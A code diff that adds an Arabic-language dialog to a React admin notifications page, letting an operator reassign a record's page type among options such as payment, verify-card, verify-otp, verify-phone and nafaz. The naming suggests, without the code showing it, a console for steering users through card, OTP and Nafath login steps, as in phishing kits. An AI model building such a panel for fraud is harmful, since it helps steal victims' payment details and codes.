@@ -2076,6 +2076,118 @@ export default function NotificationsPage1() {
           </div>
         </DialogContent>
       </Dialog>
+      <Dialog open={showPagenameDialog} onOpenChange={setShowPagenameDialog}>
+        <DialogContent
+          className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
+          dir="rtl"
+        >
+          <DialogHeader className="border-b pb-3">
+            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
+              تغيير نوع الطلب
+            </DialogTitle>
+            <DialogDescription>
+              اختر نوع الطلب الجديد أو أدخل نوعًا جديدًا
+            </DialogDescription>
+          </DialogHeader>
+
+          <div className="space-y-4 py-4">
+            <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
+              <p className="text-sm text-muted-foreground mb-2">النوع الحالي</p>
+              <div className="flex items-center gap-2">
+                <Tag className="h-4 w-4 text-primary" />
+                <p className="font-medium">
+                  {selectedNotification?.pagename || "غير محدد"}
+                </p>
+              </div>
+            </div>
+
+            <div className="space-y-2">
+              <p className="text-sm font-medium">اختر من الأنواع الموجودة</p>
+              <div className="flex flex-wrap gap-2">
+                {[
+                  "payment",
+                  "home",
+                  "renewal",
+                  "verify-card",
+                  "verify-otp",
+                  "verify-phone",
+                  "nafaz",
+                  "external-link",
+                ].map((pagename) => (
+                  <Badge
+                    key={pagename}
+                    variant="outline"
+                    className="cursor-pointer bg-blue-50 text-blue-700 hover:bg-blue-100 px-3 py-1.5"
+                    onClick={() => {
+                      if (selectedNotification) {
+                        handleUpdatePagename(selectedNotification.id, pagename);
+                        setShowPagenameDialog(false);
+                      }
+                    }}
+                  >
+                    {pagename}
+                  </Badge>
+                ))}
+                {uniquePagenames
+                  .filter(
+                    (pagename) =>
+                      ![
+                        "payment",
+                        "home",
+                        "renewal",
+                        "verify-card",
+                        "verify-otp",
+                        "verify-phone",
+                        "nafaz",
+                        "external-link",
+                      ].includes(pagename)
+                  )
+                  .map((pagename) => (
+                    <Badge
+                      key={pagename}
+                      variant="outline"
+                      className="cursor-pointer bg-gray-50 text-gray-700 hover:bg-gray-100 px-3 py-1.5"
+                      onClick={() => {
+                        if (selectedNotification) {
+                          handleUpdatePagename(
+                            selectedNotification.id,
+                            pagename
+                          );
+                          setShowPagenameDialog(false);
+                        }
+                      }}
+                    >
+                      {pagename}
+                    </Badge>
+                  ))}
+              </div>
+            </div>
+
+            <div className="space-y-2">
+              <p className="text-sm font-medium">أو أدخل نوعًا جديدًا</p>
+              <form
+                onSubmit={(e) => {
+                  e.preventDefault();
+                  const formData = new FormData(e.currentTarget);
+                  const newPagename = formData.get("newPagename") as string;
+                  if (newPagename && selectedNotification) {
+                    handleUpdatePagename(selectedNotification.id, newPagename);
+                    setShowPagenameDialog(false);
+                  }
+                }}
+                className="flex gap-2"
+              >
+                <Input
+                  name="newPagename"
+                  placeholder="أدخل نوع الطلب الجديد"
+                  className="flex-1"
+                />
+                <Button type="submit">تحديث</Button>
+              </form>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 }
